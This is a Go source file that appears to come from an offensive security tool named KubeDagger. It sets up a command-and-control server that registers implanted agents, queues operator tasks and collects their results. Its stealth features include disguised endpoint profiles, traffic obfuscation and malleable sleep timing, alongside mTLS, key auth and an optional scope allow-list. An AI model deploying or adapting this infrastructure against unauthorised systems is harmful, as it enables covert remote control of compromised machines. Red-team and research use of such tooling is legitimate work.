package c2server

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"time"

	"github.com/sirupsen/logrus"
	"github.com/yasindce1998/KubeDagger/pkg/agent/stealth"
	"github.com/yasindce1998/KubeDagger/pkg/events"
	"github.com/yasindce1998/KubeDagger/pkg/malleable"
	"github.com/yasindce1998/KubeDagger/pkg/scope"
)

// SubmitAPIPath is the operator-facing HTTP route for submitting tasks.
const SubmitAPIPath = "/api/v1/tasks"

type ServerConfig struct {
	ListenAddr string
	TLSConfig  *tls.Config
	Endpoints  stealth.EndpointProfile
	PSK        string
	RateLimit  float64
	RateBurst  int
	ObfuscKey  string

	// Optional integrations. All are nil-safe: the server behaves exactly
	// like the legacy deployment when they are unset.
	Events  *events.Store      // structured telemetry for checkins/tasks/results
	Scope   *scope.Scope       // allow-list policy enforced on task submission
	Profile *malleable.Profile // malleable profile driving sleep intervals
}

type Server struct {
	config      ServerConfig
	httpSrv     *http.Server
	agents      *AgentRegistry
	tasks       *TaskQueue
	handlers    *Handlers
	rateLimiter *RateLimiter
}

func NewServer(cfg ServerConfig) *Server {
	agents := NewAgentRegistry()
	tasks := NewTaskQueue()

	var hopts []HandlersOption
	if cfg.Events != nil {
		hopts = append(hopts, WithEvents(cfg.Events))
	}
	if cfg.Scope != nil {
		hopts = append(hopts, WithScope(cfg.Scope))
	}
	if cfg.Profile != nil {
		hopts = append(hopts, WithProfile(cfg.Profile))
	}
	handlers := NewHandlers(agents, tasks, hopts...)

	endpoints := cfg.Endpoints
	if endpoints.Checkin == "" {
		endpoints = stealth.GetProfile("legacy")
	}

	mux := http.NewServeMux()
	mux.HandleFunc(endpoints.Checkin, handlers.HandleCheckin)
	mux.HandleFunc(endpoints.Task, handlers.HandleTask)
	mux.HandleFunc(endpoints.Result, handlers.HandleResult)
	mux.HandleFunc(SubmitAPIPath, handlers.HandleSubmit)

	var handler http.Handler = mux

	var rl *RateLimiter
	if cfg.RateLimit > 0 {
		burst := cfg.RateBurst
		if burst == 0 {
			burst = int(cfg.RateLimit) * 2
		}
		rl = NewRateLimiter(cfg.RateLimit, burst)
		handler = rl.Middleware(handler)
	}

	if cfg.ObfuscKey != "" {
		om := NewObfuscationMiddleware(cfg.ObfuscKey)
		handler = om.Middleware(handler)
	}

	if cfg.PSK != "" {
		handler = AuthMiddleware(cfg.PSK, handler)
	}

	srv := &http.Server{
		Addr:         cfg.ListenAddr,
		Handler:      handler,
		TLSConfig:    cfg.TLSConfig,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	return &Server{
		config:      cfg,
		httpSrv:     srv,
		agents:      agents,
		tasks:       tasks,
		handlers:    handlers,
		rateLimiter: rl,
	}
}

func (s *Server) Agents() *AgentRegistry {
	return s.agents
}

func (s *Server) Tasks() *TaskQueue {
	return s.tasks
}

// Events returns the configured event store, if any.
func (s *Server) Events() *events.Store {
	return s.config.Events
}

// Scope returns the configured scope policy, if any.
func (s *Server) Scope() *scope.Scope {
	return s.config.Scope
}

// Profile returns the configured malleable profile, if any.
func (s *Server) Profile() *malleable.Profile {
	return s.config.Profile
}

func (s *Server) Start() error {
	s.agents.Start()

	ln, err := net.Listen("tcp", s.config.ListenAddr)
	if err != nil {
		return fmt.Errorf("listen: %w", err)
	}

	if s.config.TLSConfig != nil {
		ln = tls.NewListener(ln, s.config.TLSConfig)
		logrus.Infof("c2 server listening on %s (mTLS + HTTP/2)", s.config.ListenAddr)
	} else {
		logrus.Infof("c2 server listening on %s (plaintext, dev mode)", s.config.ListenAddr)
	}

	go func() {
		if err := s.httpSrv.Serve(ln); err != nil && err != http.ErrServerClosed {
			logrus.Errorf("c2 server error: %v", err)
		}
	}()

	return nil
}

func (s *Server) Stop(ctx context.Context) error {
	s.agents.Stop()
	if s.rateLimiter != nil {
		s.rateLimiter.Stop()
	}
	return s.httpSrv.Shutdown(ctx)
}
